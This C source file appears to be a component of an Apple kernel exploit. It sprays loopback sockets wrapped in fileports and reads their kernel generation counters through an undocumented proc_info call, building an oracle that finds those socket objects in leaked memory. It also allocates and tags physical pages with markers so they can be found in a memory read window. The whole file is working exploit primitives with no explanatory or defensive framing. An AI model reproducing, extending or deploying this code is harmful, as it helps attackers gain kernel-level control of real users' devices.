// ds_oracle.c — see ds_oracle.h
#include "ds_oracle.h"
#include "ds_log.h"

#include <mach/mach_vm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#ifndef SYS_proc_info
#define SYS_proc_info 336
#endif

#define DS_PROC_INFO_CALL_PIDFILEPORTINFO   6
#define DS_PROC_PIDFILEPORTSOCKETINFO       3

extern int fileport_makeport(int fd, mach_port_t *portname);

static int ds_proc_info(int callnum, int pid, int flavor, uint64_t arg, void *buf, int size) {
    return (int)syscall(SYS_proc_info, callnum, pid, flavor, arg, buf, size);
}

static int ds_sock_create(void) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
        return -1;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    a.sin_port = 0;
    if (bind(fd, (struct sockaddr *)&a, sizeof(a)) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

// fills the socket_fdinfo blob for a fileport; returns blob size or -1
static int ds_socket_blob(mach_port_t fp, void *blob, size_t blob_size) {
    memset(blob, 0, blob_size);
    int r = ds_proc_info(DS_PROC_INFO_CALL_PIDFILEPORTINFO, getpid(),
                         DS_PROC_PIDFILEPORTSOCKETINFO, fp, blob, (int)blob_size);
    return r == 0 ? 0 : -1;
}

int ds_oracle_calibrate(size_t *gencnt_offset_out) {
    unsigned char b[3][0x400];
    int fds[3] = {-1, -1, -1};
    mach_port_t fps[3] = {MACH_PORT_NULL, MACH_PORT_NULL, MACH_PORT_NULL};

    for (int i = 0; i < 3; i++) {
        fds[i] = ds_sock_create();
        if (fds[i] < 0 || fileport_makeport(fds[i], &fps[i]) != 0) {
            DS_LOG("calibrate: socket/fileport failed (%s)", strerror(errno));
            goto fail;
        }
        if (ds_socket_blob(fps[i], b[i], sizeof(b[i])) < 0) {
            DS_LOG("calibrate: proc_info rejected fileport %d", i);
            goto fail;
        }
    }

    size_t found = 0;
    for (size_t off = 0; off + 8 <= sizeof(b[0]); off += 8) {
        uint64_t v0 = *(uint64_t *)(b[0] + off);
        uint64_t v1 = *(uint64_t *)(b[1] + off);
        uint64_t v2 = *(uint64_t *)(b[2] + off);
        if (v0 && v1 == v0 + 1 && v2 == v1 + 1) {
            DS_LOG("calibrate: gencnt @ 0x%zx (v0=0x%llx)", off, (unsigned long long)v0);
            found = off;
            break;
        }
    }
    for (int i = 0; i < 3; i++) {
        if (fps[i] != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), fps[i]);
        if (fds[i] >= 0) close(fds[i]);
    }
    if (!found)
        return -1;
    *gencnt_offset_out = found;
    return 0;

fail:
    for (int i = 0; i < 3; i++) {
        if (fps[i] != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), fps[i]);
        if (fds[i] >= 0) close(fds[i]);
    }
    return -1;
}

int ds_oracle_spray(ds_sock *socks, int n, size_t gencnt_offset) {
    unsigned char blob[0x400];
    int made = 0;
    for (int i = 0; i < n; i++) {
        int fd = ds_sock_create();
        if (fd < 0)
            break;
        mach_port_t fp = MACH_PORT_NULL;
        if (fileport_makeport(fd, &fp) != 0) {
            close(fd);
            break;
        }
        if (ds_socket_blob(fp, blob, sizeof(blob)) < 0) {
            mach_port_deallocate(mach_task_self(), fp);
            close(fd);
            break;
        }
        socks[i].fd = fd;
        socks[i].fileport = fp;
        socks[i].gencnt = *(uint64_t *)(blob + gencnt_offset);
        made++;
    }
    DS_LOG("spray: %d/%d sockets live, gencnt range 0x%llx..0x%llx", made, n,
           made ? (unsigned long long)socks[0].gencnt : 0ULL,
           made ? (unsigned long long)socks[made - 1].gencnt : 0ULL);
    return made;
}

void ds_oracle_release(ds_sock *socks, int n) {
    for (int i = 0; i < n; i++) {
        if (socks[i].fileport != MACH_PORT_NULL)
            mach_port_deallocate(mach_task_self(), socks[i].fileport);
        if (socks[i].fd >= 0)
            close(socks[i].fd);
        socks[i].fd = -1;
        socks[i].fileport = MACH_PORT_NULL;
    }
}

int ds_oracle_find(const void *buf, size_t len, const ds_sock *socks, int n,
                   int *idx_out, size_t *off_out) {
    const unsigned char *p = buf;
    for (size_t off = 0; off + 8 <= len; off += 8) {
        uint64_t v = *(const uint64_t *)(p + off);
        if (!v)
            continue;
        for (int i = 0; i < n; i++) {
            if (socks[i].gencnt == v) {
                if (idx_out) *idx_out = i;
                if (off_out) *off_out = off;
                return 1;
            }
        }
    }
    return 0;
}

int ds_arena_init(ds_arena *a, size_t chunk_size, int chunks) {
    memset(a, 0, sizeof(*a));
    if (chunks > DS_ARENA_CHUNKS)
        chunks = DS_ARENA_CHUNKS;

    for (int c = 0; c < chunks; c++) {
        mach_vm_address_t addr = 0;
        kern_return_t kr = mach_vm_allocate(mach_task_self(), &addr, chunk_size,
                                            VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
        if (kr != KERN_SUCCESS) {
            DS_LOG("arena: chunk %d alloc failed (kr=%d) after %d chunks", c, kr, c);
            break;
        }
        a->base[a->chunks] = addr;
        a->size[a->chunks] = chunk_size;
        a->chunks++;

        // fault and tag every page: this is what forces real, scattered physical
        // backing instead of a lazy reservation
        for (size_t o = 0; o < chunk_size; o += 0x4000) {
            *(volatile uint64_t *)(addr + o) = DS_ARENA_MARKER | (a->pages & 0xffffff);
            a->pages++;
        }
    }
    DS_LOG("arena: %d chunks, %llu pages faulted", a->chunks, (unsigned long long)a->pages);
    return a->chunks;
}

long ds_arena_scan(const void *buf, size_t len) {
    const unsigned char *p = buf;
    for (size_t off = 0; off + 8 <= len; off += 8) {
        uint64_t v = *(const uint64_t *)(p + off);
        if ((v & 0xffffffff00000000ULL) == DS_ARENA_MARKER) {
            long idx = (long)(v & 0xffffff);
            DS_LOG("arena: marker for page %ld found at window+0x%zx", idx, off);
            return idx;
        }
    }
    return -1;
}

void ds_arena_free(ds_arena *a) {
    for (int c = 0; c < a->chunks; c++)
        mach_vm_deallocate(mach_task_self(), a->base[c], a->size[c]);
    memset(a, 0, sizeof(*a));
}
